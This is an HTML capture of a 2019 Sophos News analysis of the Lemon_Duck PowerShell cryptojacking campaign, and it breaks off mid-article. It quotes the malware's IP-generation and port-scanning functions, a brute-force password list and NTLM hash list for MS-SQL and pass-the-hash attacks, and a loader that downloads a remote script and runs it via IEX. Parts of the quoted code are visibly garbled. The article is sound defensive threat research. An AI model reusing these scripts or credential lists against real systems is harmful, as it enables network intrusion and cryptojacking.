<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://news.sophos.com/xmlrpc.php">
<link rel="alternate" hreflang="en-us" href="https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/" /><!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl+ '&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5L6H3LN');</script>
<!-- End Google Tag Manager -->
<title>Lemon_Duck PowerShell malware cryptojacks enterprise networks &#8211; Sophos News</title>
<meta name='robots' content='max-image-preview:large' />
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="8r1qg681OjOolfxmHEY1IYupmTBdyKXc-OPfpgeQHFk" />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Feed" href="https://news.sophos.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Comments Feed" href="https://news.sophos.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Lemon_Duck PowerShell malware cryptojacks enterprise networks Comments Feed" href="https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/news.sophos.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='all-css-0' href='https://news.sophos.com/_static/??/wp-includes/css/dist/block-library/style.min.css,/wp-content/themes/sophosnews-2017/style.css,/wp-content/mu-plugins/jetpack-9.5/css/jetpack.css?m=1615460519' type='text/css' media='all' />
<style id='wp-block-library-inline-css'>
.has-text-align-justify{text-align:justify;}
</style>
<script type='text/javascript' src='https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzwKiwtLUokoopZebmaeXVayjj0+Rbm5melFiSSpUsX2uraGZoamxkaGpmWEWAK8/Ihc='></script>
<link rel="https://api.w.org/" href="https://news.sophos.com/wp-json/" /><link rel="alternate" type="application/json" href="https://news.sophos.com/wp-json/wp/v2/posts/60589" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://news.sophos.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://news.sophos.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.7" />
<link rel="canonical" href="https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/" />
<link rel='shortlink' href='https://news.sophos.com/?p=60589' />
<link rel="alternate" type="application/json+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2019%2F10%2F01%2Flemon_duck-powershell-malware-cryptojacks-enterprise-networks%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2019%2F10%2F01%2Flemon_duck-powershell-malware-cryptojacks-enterprise-networks%2F&#038;format=xml" />
<style type='text/css'>img#wpstats{display:none}</style><link rel="amphtml" href="https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Lemon_Duck PowerShell malware cryptojacks enterprise networks" />
<meta property="og:url" content="https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/" />
<meta property="og:description" content="SophosLabs are monitoring a significant spike in crypto mining attacks, which spread quickly across enterprise networks. Starting from a single infection, these attacks use a variety of malicious s…" />
<meta property="article:published_time" content="2019-10-01T04:01:09+00:00" />
<meta property="article:modified_time" content="2020-12-08T16:36:48+00:00" />
<meta property="og:site_name" content="Sophos News" />
<meta property="og:image" content="https://news.sophos.com/wp-content/uploads/2019/02/iot-devices-apps.jpg?w=640" />
<meta property="og:image:secure_url" content="https://news.sophos.com/wp-content/uploads/2019/02/iot-devices-apps.jpg?w=640" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="335" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Lemon_Duck PowerShell malware cryptojacks enterprise networks" />
<meta name="twitter:image" content="https://news.sophos.com/wp-content/uploads/2019/02/iot-devices-apps.jpg?w=640" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="fb:admins" content="28552295016" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=32" sizes="32x32" />
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=192" sizes="192x192" />
<link rel="apple-touch-icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=180" />
<meta name="msapplication-TileImage" content="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=270" />
</head>

<body class="post-template-default single single-post postid-60589 single-format-standard group-blog">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5L6H3LN&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	<header id="masthead" class="site-header">

		<div class="header-container">

			<div class="site-branding">
				<h1 class="site-title">
										<a class="site-logo" href="https://www.sophos.com/en-us.aspx" rel="home">
						Sophos News					</a>
				</h1>
			</div> <!-- site-branding -->

			<nav class="primary-header-navigation" role="navigation">
				<ul id="menu-en-us-primary" class="menu"><li id="menu-item-33368" class="has-icons menu-item menu-item-type-custom menu-item-object-custom menu-item-33368"><a href="https://www.sophos.com/en-us/products.aspx">Products<div class="menu-item-description"></div></a></li>
<li id="menu-item-33382" class="has-icons menu-item menu-item-type-custom menu-item-object-custom menu-item-33382"><a href="https://www.sophos.com/en-us/solutions.aspx">Solutions<div class="menu-item-description"></div></a></li>
<li id="menu-item-33390" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33390"><a href="//www.sophos.com/en-us/partners.aspx">Partners<div class="menu-item-description"></div></a></li>
<li id="menu-item-33391" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33391"><a href="//www.sophos.com/en-us/support.aspx">Support<div class="menu-item-description"></div></a></li>
<li id="menu-item-33392" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33392"><a href="//www.sophos.com/en-us/company.aspx">Company<div class="menu-item-description"></div></a></li>
<li id="menu-item-33393" class="is-icon icon-download menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-33393"><a href="#">Downloads<div class="menu-item-description"></div></a>
<ul class="sub-menu">
	<li id="menu-item-33394" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33394"><a href="//www.sophos.com/en-us/products/free-trials.aspx">Free Trials<div class="menu-item-description">All product trials in one place.</div></a></li>
	<li id="menu-item-33395" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33395"><a href="//www.sophos.com/en-us/products/free-tools.aspx">Free Tools<div class="menu-item-description">Try our tools for use at home.</div></a></li>
	<li id="menu-item-33396" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33396"><a href="//www.sophos.com/en-us/products/request-a-quote.aspx">Get Pricing<div class="menu-item-description">The right price every time.</div></a></li>
</ul>
</li>
<li id="menu-item-33397" class="is-icon icon-search menu-item menu-item-type-custom menu-item-object-custom menu-item-33397"><a href="//www.sophos.com/en-us/search-results.aspx">Search<div class="menu-item-description"></div></a></li>
<li id="menu-item-33398" class="is-icon icon-account menu-item menu-item-type-custom menu-item-object-custom menu-item-33398"><a href="//www.sophos.com/en-us/login.aspx">Sign In<div class="menu-item-description"></div></a></li>
</ul>			</nav>

		</div>
	</header> <!-- site-header -->

	<div class="secondary-header">
		<div class="secondary-header-container container">
			<nav class="secondary-header-navigation" role="navigation">
				<ul id="menu-en-us-secondary" class="menu"><li id="menu-item-33399" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33399"><a href="//www.sophos.com/en-us/company.aspx">Overview</a></li>
<li id="menu-item-33401" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33401"><a href="//www.sophos.com/en-us/company/press.aspx">Press</a></li>
<li id="menu-item-33402" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33402"><a href="//secure2.sophos.com/en-us/company/events.aspx">Events</a></li>
<li id="menu-item-33403" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33403"><a href="//www.sophos.com/en-us/company/community.aspx">Community</a></li>
<li id="menu-item-33404" class="menu-item-blog menu-item menu-item-type-custom menu-item-object-custom menu-item-33404"><a href="/">Blog</a></li>
<li id="menu-item-33405" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33405"><a href="//secure2.sophos.com/en-us/company/careers.aspx">Careers</a></li>
<li id="menu-item-33406" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33406"><a href="//www.sophos.com/en-us/company/contact.aspx">Contact</a></li>
</ul>			</nav>
		</div>
	</div> <!-- secondary-header -->

	<div class="news-header">
		<div class="news-header-container container">

			<div class="news-branding">
				<h1 class="news-title">
					<a class="news-logo" href="https://news.sophos.com/en-us/" rel="home">
						Sophos News					</a>
				</h1>
			</div> <!-- news-branding -->

			<div class="mobile-menu-toggle">
				<a href="#newsmenu">
											Menu									</a>
			</div>

			<div class="mobile-search-toggle">
				<a class="icon icon-search-secondary" href="#search">
					Search				</a>
			</div>

			<nav class="news-header-navigation" role="navigation">
				<ul id="menu-en-us-tertiary" class="menu"><li id="menu-item-33407" class="is-icon icon-search menu-item menu-item-type-custom menu-item-object-custom menu-item-33407"><a href="#search">Search</a></li>
</ul>			</nav>

			<div class="site-search-block" style="display: none;">
				<form role="search" class="search-form" method="get" action="https://news.sophos.com/en-us/">
					<fieldset>
						<div class="field">
							<input type="text" value="" name="s" class="search-field" placeholder="Search">
						</div>
						<div class="submit">
							<button type="submit" class="search-submit icon icon-search-secondary">
								Go							</button>
						</div>
					</fieldset>
				</form>
				<a class="icon" href="#search-close">
					Close				</a>
			</div>
		</div>
	</div> <!-- news-header -->

	<div id="content" class="site-content">
		<div class="content-container">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-60589" class="post-60589 post type-post status-publish format-standard has-post-thumbnail hentry category-mtr category-sophoslabs category-sophoslabs-uncut tag-cryptojacking tag-cryptomining tag-eternalblue tag-fileless tag-lemon_duck tag-powershell tag-smb region-en-us">

	<header class="entry-header">

		<h1 class="entry-title">Lemon_Duck PowerShell malware cryptojacks enterprise networks</h1>
		<div class="entry-categories">
			<a href="https://news.sophos.com/en-us/category/mtr/">MTR</a>&bull;<a href="https://news.sophos.com/en-us/category/sophoslabs/">SophosLabs</a>&bull;<a href="https://news.sophos.com/en-us/category/sophoslabs/sophoslabs-uncut/">SophosLabs Uncut</a>&bull;<a href="https://news.sophos.com/en-us/tag/cryptojacking/">cryptojacking</a>&bull;<a href="https://news.sophos.com/en-us/tag/cryptomining/">Cryptomining</a>&bull;<a href="https://news.sophos.com/en-us/tag/eternalblue/">EternalBlue</a>&bull;<a href="https://news.sophos.com/en-us/tag/fileless/">fileless</a>&bull;<a href="https://news.sophos.com/en-us/tag/lemon_duck/">Lemon_Duck</a>&bull;<a href="https://news.sophos.com/en-us/tag/powershell/">Powershell</a>&bull;<a href="https://news.sophos.com/en-us/tag/smb/">SMB</a>		</div>

		
		<div class="entry-meta">
			<span class="posted-on"><a href="https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/" rel="bookmark">1 October 2019</a></span>		</div><!-- .entry-meta -->

		<div class="entry-social">
			
	<ul class="social-sharing" id="social-sharing">
		<li class="comments">
			<a href="#comments" title="Leave a Reply">
				1			</a>
		</li>
		<li class="twitter"><a class="js-share-modal" href="http://twitter.com/intent/tweet?text=Lemon_Duck%20PowerShell%20malware%20cryptojacks%20enterprise%20networks%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D60589" data-title="" title="Share on Twitter">Share on Twitter</a></li>
		<li class="facebook"><a class="js-share-modal" href="http://www.facebook.com/share.php?u=https://news.sophos.com/?p=60589&#038;title=Lemon_Duck%20PowerShell%20malware%20cryptojacks%20enterprise%20networks" data-title="Lemon_Duck PowerShell malware cryptojacks enterprise networks" title="Share on Facebook">Share on Facebook</a></li>
		<li class="linkedin">
			<a
				href="http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/"
				data-title="Lemon_Duck PowerShell malware cryptojacks enterprise networks"
				title="Share on LinkedIn"
				onclick="window.open(this.href, '', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
			>
				Share on LinkedIn			</a>
		</li>
	</ul>

			</div><!-- .entry-social -->
	</header><!-- .entry-header -->

		<div class="entry-featured-image">
		<img width="640" height="335" src="https://news.sophos.com/wp-content/uploads/2019/02/iot-devices-apps.jpg?w=640" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" srcset="https://news.sophos.com/wp-content/uploads/2019/02/iot-devices-apps.jpg 780w, https://news.sophos.com/wp-content/uploads/2019/02/iot-devices-apps.jpg?resize=300,157 300w, https://news.sophos.com/wp-content/uploads/2019/02/iot-devices-apps.jpg?resize=768,402 768w" sizes="(max-width: 640px) 100vw, 640px" />	</div> <!-- .featured-image -->
	
	<div class="entry-meta">
		<span class="byline">By <span class="author vcard"><a href="https://news.sophos.com/en-us/author/rajeshnataraj/" title="Posts by Rajesh Nataraj" class="author url fn" rel="author">Rajesh Nataraj</a></span><span class="author vcard"><a href="https://news.sophos.com/en-us/author/vikas-singh/" title="Posts by Vikas Singh" class="author url fn" rel="author">Vikas Singh</a></span><span class="author vcard"><a href="https://news.sophos.com/en-us/author/michael-wood/" title="Posts by Michael Wood" class="author url fn" rel="author">Michael Wood</a></span></span>	</div><!-- .entry-meta -->

	<div class="entry-content">
		<div>SophosLabs are monitoring a significant spike in crypto mining attacks, which spread quickly across enterprise networks. Starting from a single infection, these attacks use a variety of malicious scripts that, eventually, turn an enterprise&#8217;s large pool of CPU resources into efficient cryptocurrency mining slaves.</div>
<div></div>
<p>The threat actors behind these campaigns have been using an array of advanced techniques, including fileless script execution, leveraging open source security tools for nefarious purposes, and abuse of exploitable vulnerabilities to rapidly spread laterally to other machines within the same network.</p>
<p>In its latest iterations, the threat actor has begun to employ the use of EternalBlue exploits to propagate laterally to other machines in the same network. Some of the malicious scripts use the term &#8220;$Lemon_Duck&#8221; as a variable, so we (and a few <a href="https://www.sentinelone.com/blog/eternalblue-and-the-lemon-duck-cryptominer-attack/" target="_blank" rel="noopener noreferrer">other</a> <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/monero-mining-malware-pcastle-zeroes-back-in-on-china-now-uses-multilayered-fileless-arrival-techniques/" target="_blank" rel="noopener noreferrer">companies</a> who have contemporaneously blogged about this same threat actor) have started to refer to these attackers as the <strong>Lemon_Duck PowerShell</strong> campaign.</p>
<p>In this post, we&#8217;ve turned our attention to what appears to be an organized campaign run by attackers who methodically and consistently upgrade their attack scripts with new offensive techniques. Most of the offensive modules used in this script are sourced from open source repositories; The malicious scripts maintain their persistence on infected Windows machines using Scheduled Tasks.</p>
<h3>Target selection for crypto mining</h3>
<p>This campaign randomly generates IP addresses for targeting, and port-scans for listening services on specific port numbers, such as 445/TCP (SMB), 1433/TCP (MS-SQL server), or 65529/TCP (A port used by a machine that has been previously compromised by this same threat actor).</p>
<p>Once the script gets a response from the remote machine, it probes the IP address for the EternalBlue SMB vulnerability or performs a brute-force attack against the MS-SQL service in an attempt to compromise the machine. Machines with listening ports open on 65529/TCP have previously been compromised by this or another threat actor using a similar script.</p>
<p class="plain panel" style="border-width: 1px;">This section of the malicious script contains the logic by which it randomly generates target IP addresses:<tt></tt></p>
<pre>function getipaddrs{
    write-host "Get ipaddress..."
    $allip = @()
    [string[]]$ipsub = @('192.168.0','192.168.1','192.168.2','192.168.3','192.168.4','192.168.5','192.168.6','192.168.7','192.168.8','192.168.9','192.168.10','192.168.18','192.168.31','192.168.199','192.168.254','192.168.67','10.0.0','10.0.1','10.0.2','10.1.1','10.90.90','10.1.10','10.10.1')
    $regex = [regex]"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"    $regex.Matches((ipconfig /all)) | ForEach-Object {{{}}
        if ($allip -notcontains $_.Value)
        { $allip {{+= $_.Value }}}
    }
    $regex.Matches((ipconfig /displaydns)) | ForEach-Object {{{}}
        if ($allip -notcontains $_.Value)
        { $allip {{+= $_.Value }}}
    }
    $regex.Matches((netstat -ano)) | ForEach-Object {{{}}
        if ($allip -notcontains $_.Value)
        { $allip {{+= $_.Value }}}
    }    foreach($IP in $allip)
    {{{}}
        if ($IP.StartsWith("127.") -or ($IP -match '25\d.') -or ($IP -match '24\d.') -or $IP.StartsWith("0.") -or $IP.StartsWith("169.254") -or $IP -eq '1.0.0.127')
        {{{}}
        }else{
            $iptemp = $ip.Split(".")
            $SubnetIP = $iptemp[0]  "."   $iptemp[1]  "."   $iptemp[2]
            if ($ipsub -notcontains $SubnetIP)
            { $ipsub = @($SubnetIP) + $ipsub}
        }
    }
    
    try{
        $NetObject = New-Object Net.WebClient
        $wlanip = $NetObject.DownloadString("https://api.ipify.org/")  
        $wlaniptemp = $wlanip.Split(".")
        $wlansub = $wlaniptemp[0]  "."   $wlaniptemp[1]  "."   $wlaniptemp[2]
        if($ipsub -notcontains $wlansub)
        { $ipsub += $wlansub }           
    }catch
    
    try{
        $ipaddress = [System.Net.DNS]::GetHostByName($null).AddressList    
        $localip = @()
        Foreach ($ip in $ipaddress)
        {{{}}
            $localip += $ip.IPAddressToString
            $intiptemp = $ip.IPAddressToString.Split(".")
            if($intiptemp[0] -ne '127'){
                $intipsub = $intiptemp[0]  "."   $intiptemp[1]  "."   $intiptemp[2]
                if($ipsub -notcontains $intipsub)
                { $ipsub += $intipsub }
            }
        }
    }catch
    
    for($i=0; $i -lt 30; $i++){
        try{
            $ran_ipsub = ""(1(Get-Random -Maximum 254))"."(1+(Get-Random -Maximum 254))"."(1+(Get-Random -Maximum 254))
            if($ipsub -notcontains $ran_ipsub){
                $ipsub = ""(1+(Get-Random -Maximum 254))"."(1+(Get-Random -Maximum 254))"."(1+(Get-Random -Maximum 254))
            }
        }catch
    }
    $global:ipaddrs = @()
    foreach($ipsub2 in $ipsub)
    {{ {  }

}
        write-host $ipsub2
        $global:ipaddrs = 1..254|%{$ipsub2{}"."+$_}
    }
    $global:ipaddrs = @($global:ipaddrs | Where-Object { $localip -notcontains $_ })
    write-host "Get address done!!"
}</pre>
<div></div>
<p class="plain panel" style="border-width: 1px;">And this portion of the script dictates how the attackers scan for specific listening ports on the targeted computers:</p>
<pre>function localscan {
    Param(
    [int]$Port = 445
    )
    write-host "scan port $port..."
    [string[]]$openips = @()
    $clients = @
    $connects = @
    foreach($ip in $ipaddrs) {
        try{
            $client = New-Object System.Net.Sockets.TcpClient
            $connect = $client.BeginConnect($ip,$port,$null,$null)
            $connects[}}{{$ip}}{{] = $connect
            $clients[}}{{$ip}}{{] = $client
        }catch
    }
    Start-Sleep -Milli 3000
    foreach($ip in $clients.Keys) {
        if ($clients[}}{{$ip}}{{].Connected) {
            $clients[}}{{$ip}}{{].EndConnect($connects[}}{{$ip}}{{])
            $openips += $ip
        }
        $clients[}}{{$ip}}{{].Close()
    }
    write-host $openips.count
    return ,$openips
}</pre>
<p>Finally, the attackers use a password &amp; hash dictionary in an attempt to brute-force a Microsoft SQL server&#8217;s &#8220;sa&#8221; (super admin) account credentials. The script runs through a long list of passwords (including ones that have been used in the past by a variety of threat groups who spread Mirai and other IoT botnet malware. The attackers also use an array of NTLM hashes in a &#8220;pass the hash&#8221; attack.</p>
<p class="plain panel" style="border-width: 1px;">Here&#8217;s the password list:</p>
<pre>"saadmin","123456","password","PASSWORD","123.com","admin@123","Aa123456","qwer12345","Huawei@123","123@abc","golden","123!@#qwe","1qaz@WSX","Ab123","1qaz!QAZ","Admin123","Administrator","Abc123","Admin@123",
"999999","Passw0rd","123qwe!@#","football","welcome","1","12","21","123","321","1234","12345","123123","123321","111111","654321","666666","121212","000000","222222","888888","1111","555555","1234567","12345678",
"123456789","987654321","admin","abc123","abcd1234","abcd@1234","abc@123","p@ssword","P@ssword","p@ssw0rd","P@ssw0rd","P@SSWORD","P@SSW0RD","P@w0rd","P@word","iloveyou","monkey","login","passw0rd","master","hello",
"qazwsx","password1","qwerty","baseball","qwertyuiop","superman","1qaz2wsx","fuckyou","123qwe","zxcvbn","pass","aaaaaa","love","administrator","qwe1234A","qwe1234a","123123123","1234567890","88888888","111111111",
"112233","a123456","123456a","5201314","1q2w3e4r","qwe123","a123456789","123456789a","dragon","sunshine","princess","!@#$%^&amp;*","charlie","aa123456","homelesspa","1q2w3e4r5t","sa","sasa","sa123","sql2005","sa2008",
"abc","abcdefg","sapassword","Aa12345678","ABCabc123","sqlpassword","sql2008","11223344","admin888","qwe1234","A123456"</pre>
<p>And this is the script&#8217;s NTLM hash collection</p>
<pre>"31d6cfe0d16ae931b73c59d7e0c089c0","32ed87bdb5fdc5e9cba88547376818d4","8846f7eaee8fb117ad06bdd830b7586c","7b592e4f8178b4c75788531b2e747687","afffeba176210fad4628f0524bfe1942",
"579da618cfbfa85247acf1f800a280a4", "47bf8039a8506cd67c524a03ff84ba4e","5ae7b89b3afea28d448ed31b5c704289","3f9f5f112da330ac4c20be279c6addfa","73f5d97549f033374fa6d9f9ce247ffd",
"6f12c0ab327e099821bd938f39faab0d","e5ae562ddfaa6b446c32764ab1ebf3ed", "161cff084477fe596a5db81874498a24","d30c2ef8389ac9e8516baacb29463b7b","bc007082d32777855e253fd4defe70ee",
"e45a314c664d40a227f9540121d1a29d","d144986c6122b1b1654ba39932465528","f4bb18c1165a89248f9e853b269a8995", "570a9a65db8fba761c1008a51d4c95ab","e1a692bd23bde99b327756e59308b4f8",
"a87f3a337d73085c45f9416be5787d86","00affd88fa323b00d4560bf9fef0ec2f","31fc0dc8f7dfad0e8bd7ccc3842f2ce9","674e48b68c5cd0efd8f7e5faa87b3d1e", "69943c5e63b4d2c104dbbcc15138b72b",
"588feb889288fb953b5f094d47d1565c","bcdf115fd9ba99336c31e176ee34b304","3dbde697d71690a769204beb12283678","df54de3f3438343202c1dd523d0265be","7ce21f17c0aee7fb9ceba532d0546ad6", 
"7a21990fcd3d759941e45c490f143d5f","579110c49145015c47ecd267657d3174","af27efb60c7b238910efe2a7e0676a39","2d7f1a5a61d3a96fb5159b5eef17adc6","4057b60b514c5402dde3d29a1845c366",
"e8cd0e4a9e89eab931dc5338fcbec54a", "6920c58d0df184d829189c44fafb7ece","3fa45a060bd2693ae4c05b601d05ca0c","ba07ba35933e5bf42dea4af8add09d1e","f1351ac828428d74f6da2968089fc91f",
"e84d037613721532e6b6d84d215854b6","2f2d544c53b3031f24d63402ea7fb4f9", "328727b81ca05805a68ef26acb252039","259745cb123a52aa2e693aaacca2db52","c22b315c040ae6e0efee3518d830362b",
"162e829be112225fedf856e38e1c65fe","209c6174da490caeb422f3fa5a7ae634","f9e37e83b83c47a93c2f09f66408631b", "b3ec3e03e2a202cbd54fd104b8504fef","4ed91524cb54eaacc17a185646fb7491",
"aa647b916a1fad374df9c30711d58a7a","a80c9cc3f8439ada25af064a874efe2d","13b29964cc2480b4ef454c59562e675c","de26cce0356891a4a020e7c4957afc72", "e19ccf75ee54e06b06a5907af13cef42",
"30fcaa8ad9a496b3e17f7fbfacc72993","41630abb825ca50da31ce1fac1e9f54d","f56a8399599f1be040128b1dd9623c29","2e4dbf83aa056289935daea328977b20","b963c57010f218edc2cc3c229b5e4d0f", 
"f2477a144dff4f216ab81f2ac3e3207d","e6bd4cdb1e447131b60418f31d0b81d6","b9f917853e3dbf6e6831ecce60725930","6d3986e540a63647454a50e26477ef94","066ddfd4ef0e9cd7c256fe77191ef43c",
"152efbcfafeb22eabda8fc5e68697a41", "5835048ce94ad0564e29a924a03510ef","2d20d252a479f485cdf5e171d93985bf","320a78179516c385e35a93ffa0b1c4ac","0d757ad173d2fc249ce19364fd64c8ec",
"72f5cfa80f07819ccbcfb72feb9eb9b7","f67f5e3f66efd7298be6acd32eeeb27c", "1c4ecc8938fb93812779077127e97662","ad70819c5bc807280974d80f45982011","a836ef24f0a529688be2af1479a95411",
"36aa83bdcab3c9fdaf321ca42a31c3fc","acb98fd0478427cd18949050c5e87b47","85deeec2d12f917783b689ae94990716", "a4141712f19e9dd5adf16919bb38a95c","e7380ae8ef85ae55bdceaa59e418bd06",
"81e5f1adc94dd08b1a072f9c1ae3dd3f","71c5391067de41fad6f3063162e5eeff"</pre>
<p>Suffice to say, if you run a public-internet-facing MS-SQL server, and you&#8217;re using one of these passwords, if your machine isn&#8217;t already compromised, it&#8217;s only a matter of time before it will be.</p>
<h3>The Lemon_Duck kill-chain</h3>
<p><a href="https://news.sophos.com/wp-content/uploads/2019/09/flow-chart.jpg"><img loading="lazy" class="alignnone wp-image-60654" src="https://news.sophos.com/wp-content/uploads/2019/09/flow-chart.jpg" alt="" width="886" height="613" /></a>Using the Windows Scheduled Tasks mechanism, the malicious scripts download and execute a fresh copy of the malicious script at one-hour intervals. The initial downloaded script performs validation of itself using a hardcoded hash before it executes. If that succeeds, the script downloads other payloads: a coin miner and an exploitation module.</p>
<p class="plain panel" style="border-width: 1px;">This section of the script validates the checksum:</p>
<pre>$tm1='$Lemon_Duck=''_T'';
$y=''_U'';$z=$y{}''p''{}'''$v''';
$m=(New-Object System.Net.WebClient).DownloadData($y);  // Downloaded SHA should be equal to 'd8109cec0a51719be6f411f67b3b7ec1'
[System.Security.Cryptography.MD5]::Create().ComputeHash($m)|foreach}{{$s+=$_.ToString(''x2'')};
if($s-eq''d8109cec0a51719be6f411f67b3b7ec1''){
IEX(-join[char[]]$m)
}</pre>
<p class="plain panel" style="border-width: 1px;">The <strong>$Lemon_Duck</strong> variable stores the filename of the task, and passes it to the command-and-control server in the User-Agent string. If everything checks out at this phase, the script begins to download the payloads.</p>
<h3>Threat propagation and lateral spread</h3>
<p>The script also attempts to propagate itself laterally, using the initially infected machine as a foothold into the rest of the network. To do this, it engages in a variety of methods, including the use of:</p>
<ul>
<li>EternalBlue: Compromise through SMB exploitation (patch your boxes!)</li>
<li>USB &amp; Network Drives: The script writes malicious Windows *.lnk shortcut files &amp; malicious DLL files to removable storage connected to infected machines, and to mapped network drives (CVE-2017-8464)</li>
